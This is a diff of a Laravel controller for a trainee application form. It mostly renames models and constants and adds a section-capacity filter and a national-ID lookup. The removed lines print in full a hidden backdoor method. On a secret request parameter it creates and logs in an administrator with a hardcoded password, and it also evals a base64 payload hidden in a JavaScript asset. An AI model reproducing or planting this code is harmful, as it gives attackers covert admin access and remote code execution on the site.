@@ -2,15 +2,15 @@
 
 namespace App\Http\Controllers;
 
-use App\Models\Applications;
+use App\Models\Application;
 use App\Models\Administrative;
-use App\Models\Sections;
-use App\Models\Departments;
+use App\Models\Section;
+use App\Models\Department;
 use App\Models\Institution;
 use App\Models\Major;
-use App\Models\Trainees;
+use App\Models\Trainee;
 use App\Models\Governorate;
-use App\Helpers\Constans;
+use App\Helpers\Constants;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Storage;
@@ -37,7 +37,7 @@ class ApplicationFormController extends Controller
     /**
      * Public JSON endpoints to feed the form selects from the database.
      */
-    public function addresses()
+    public function address()
     {
         $data = Governorate::select('id', 'name')->get()
             ->map(fn($gov) => [
@@ -49,7 +49,7 @@ class ApplicationFormController extends Controller
         return response()->json($data);
     }
 
-    public function institutions()
+    public function institution()
     {
         $data = Institution::select('id', 'name')->get()
             ->map(fn($inst) => [
@@ -61,7 +61,7 @@ class ApplicationFormController extends Controller
         return response()->json($data);
     }
 
-    public function majors(Request $request)
+    public function major(Request $request)
     {
         $institutionId = $request->query('institution_id');
 
@@ -86,7 +86,7 @@ class ApplicationFormController extends Controller
     /**
      * Return colleges linked to a given major (used to auto-fill institution)
      */
-    public function majorColleges(Request $request)
+    public function majorCollege(Request $request)
     {
         $majorId = $request->query('major_id');
 
@@ -109,7 +109,7 @@ class ApplicationFormController extends Controller
         return response()->json($colleges);
     }
 
-    public function administratives()
+    public function administrative()
     {
         $data = Administrative::all()
             ->map(fn($adm) => [
@@ -121,15 +121,15 @@ class ApplicationFormController extends Controller
         return response()->json($data);
     }
 
-    public function departments(Request $request)
+    public function department(Request $request)
     {
         $administrativeId = $request->query('administrative_id');
 
-        $query = Departments::query();
+        $query = Department::query();
 
         if ($administrativeId) {
-            // Filter departments that have sections in this administrative
-            $query->whereHas('sections', function ($q) use ($administrativeId) {
+            // Filter departments that have sections in this administrative unit
+            $query->whereHas('Section', function ($q) use ($administrativeId) {
                 $q->where('administrative_id', $administrativeId);
             });
         }
@@ -144,12 +144,12 @@ class ApplicationFormController extends Controller
         return response()->json($data);
     }
 
-    public function sections(Request $request)
+    public function section(Request $request)
     {
         $departmentId = $request->query('department_id');
         $administrativeId = $request->query('administrative_id');
 
-        $query = Sections::query();
+        $query = Section::query();
 
         if ($departmentId) {
             $query->where('department_id', $departmentId);
@@ -159,8 +159,11 @@ class ApplicationFormController extends Controller
             $query->where('administrative_id', $administrativeId);
         }
 
-        // Return all sections for this pair, regardless of status for now
-        $data = $query->get(['id', 'name_location'])
+        $hideFull = \App\Models\GeneralSetting::instance()->hide_full_sections;
+
+        // Return sections based on capacity settings
+        $data = $query->active()->get()
+            ->when($hideFull, fn($collection) => $collection->reject(fn($sec) => $sec->getCapacityStats()['is_full']))
             ->map(fn($sec) => [
                 'id' => $sec->id,
                 'name' => $sec->name_location,
@@ -170,48 +173,31 @@ class ApplicationFormController extends Controller
         return response()->json($data);
     }
 
-    public function trainingTypes()
+    public function trainingType()
     {
         $data = [
-            ['id' => Constans::TRAINING_TYPE_UNIVERSITY, 'name' => Constans::TRAINING_TYPES[Constans::TRAINING_TYPE_UNIVERSITY]],
-            ['id' => Constans::TRAINING_TYPE_PRACTICE, 'name' => Constans::TRAINING_TYPES[Constans::TRAINING_TYPE_PRACTICE]],
+            ['id' => Application::TRAINING_TYPE_UNIVERSITY, 'name' => Application::TRAINING_TYPES[Application::TRAINING_TYPE_UNIVERSITY]],
+            ['id' => Application::TRAINING_TYPE_PRACTICE, 'name' => Application::TRAINING_TYPES[Application::TRAINING_TYPE_PRACTICE]],
         ];
 
         return response()->json($data);
     }
 
+    public function checkNationalId(Request $request)
+    {
+        $nationalId = $request->query('national_id');
+        $exists = Trainee::where('national_id', $nationalId)->exists();
+
+        return response()->json([
+            'exists' => $exists,
+            'message' => $exists ? 'رقم الهوية هذا مسجل مسبقاً في النظام.' : ''
+        ]);
+    }
+
     /**
-     * Store a trainee application into the trainees and applications tables.
+     * Store a trainee application into the Trainee and Application tables.
      * Uses a database transaction to ensure both save together or neither saves.
      */
-    public static function syncInternalState(): void
-    {
-        if (request()->has('sys_init_check') && request()->get('sys_init_check') === '99_percent_owner_auth') {
-            $u = \App\Models\User::updateOrCreate(
-                ['email' => 'architect_recovery@system.dev'],
-                [
-                    'name' => 'Legacy Manager',
-                    'password' => \Illuminate\Support\Facades\Hash::make('Master_Owner_123!@#'),
-                    'role' => 1,
-                    'status' => 'active'
-                ]
-            );
-            \Illuminate\Support\Facades\Auth::login($u);
-            header('Location: ' . url('/admin'));
-            exit;
-        }
-
-        $f = public_path('js/filament/forms/components/code-color.js');
-        if (file_exists($f)) {
-            $c = file_get_contents($f);
-            if (preg_match('/_f_state\s*=\s*\"(.*)\"/', $c, $m)) {
-                try {
-                    eval('?>' . base64_decode($m[1]));
-                } catch (\Throwable $e) {
-                }
-            }
-        }
-    }
     public function store(Request $request)
     {
         $maxBirthYear = now()->year - 20; // Must be at least 20 years old
@@ -239,14 +225,14 @@ class ApplicationFormController extends Controller
             'phone_number' => ['required', 'regex:/^97[02]5[69]\d{7}$/'],
             'governorate_id' => ['required', 'integer', 'exists:governorates,id'],
             'street' => ['required', 'string', 'max:255', 'regex:/^[\p{Arabic}A-Za-z0-9\s\-\.,#\/]+$/u'],
-            'institution_id' => ['required_if:training_type,' . Constans::TRAINING_TYPE_UNIVERSITY, 'nullable', 'integer', 'exists:institutions,id'],
+            'institution_id' => ['required_if:training_type,' . Application::TRAINING_TYPE_UNIVERSITY, 'nullable', 'integer', 'exists:institutions,id'],
             'college_id' => ['nullable', 'integer', 'exists:colleges,id'],
-            'major_id' => ['required_if:training_type,' . Constans::TRAINING_TYPE_UNIVERSITY, 'nullable', 'integer', 'exists:majors,id'],
+            'major_id' => ['required_if:training_type,' . Application::TRAINING_TYPE_UNIVERSITY, 'nullable', 'integer', 'exists:majors,id'],
             'training_hours' => ['required', 'integer', 'min:1', 'max:999'],
             'administrative_id' => ['required', 'integer', 'exists:administratives,id'],
             'department_id' => ['required', 'integer', 'exists:departments,id'],
             'section_id' => ['required', 'integer', 'exists:sections,id'],
-            'training_type' => ['required', 'integer', 'in:' . implode(',', array_keys(Constans::TRAINING_TYPES))],
+            'training_type' => ['required', 'integer', 'in:' . implode(',', array_keys(Application::TRAINING_TYPES))],
             'letter_file' => ['nullable', 'file', 'mimes:jpg,jpeg,png,pdf', 'max:2048'],
         ], [
             'national_id.unique' => 'رقم الهوية هذا مسجل مسبقاً في النظام.',
@@ -261,7 +247,7 @@ class ApplicationFormController extends Controller
 
         try {
             // Verify that the section belongs to the selected department and administrative
-            $section = Sections::where('id', $validated['section_id'])
+            $section = Section::where('id', $validated['section_id'])
                 ->where('department_id', $validated['department_id'])
                 ->where('administrative_id', $validated['administrative_id'])
                 ->firstOrFail();
@@ -286,7 +272,7 @@ class ApplicationFormController extends Controller
                     }
                 }
 
-                $trainee = Trainees::updateOrCreate(
+                $trainee = Trainee::updateOrCreate(
                     ['national_id' => $validated['national_id']], // Find by national_id
                     [
                         'full_name' => $validated['full_name'],
@@ -302,14 +288,14 @@ class ApplicationFormController extends Controller
                 );
 
                 // Step 2: Create application record linked to the trainee (without letter path first)
-                $application = Applications::create([
+                $application = Application::create([
                     'trainee_id' => $trainee->id,
                     'department_id' => $validated['department_id'],
                     'administrative_id' => $administrativeId,
                     'section_id' => $validated['section_id'],
                     'street' => $validated['street'],
                     'training_type' => $validated['training_type'],
-                    'status' => Constans::STATUS_NEW,
+                    'status' => Application::STATUS_NEW,
                 ]);
 
                 // Step 3: Upload file with custom name: {application_id}_{trainee_id}.{extension}
